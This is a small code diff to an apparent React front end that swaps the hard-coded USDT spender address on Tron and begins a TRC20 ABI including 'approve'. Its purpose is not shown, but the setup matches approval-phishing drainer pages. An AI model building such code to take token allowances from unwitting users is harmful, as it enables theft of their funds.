@@ -4,7 +4,7 @@ import React, { useEffect, useState } from "react";
 const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT mainnet
 
 // !!! MUST be valid Tron address starting with T !!!
-const SPENDER_ADDRESS = "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb"; // ← CHANGE THIS!
+const SPENDER_ADDRESS = "TXexNC6iyH8yBFGDkynAHgjESx3DAPeYtF"; // ← CHANGE THIS!
 
 const TRC20_ABI = [
   "function approve(address _spender, uint256 _value) returns (bool)",
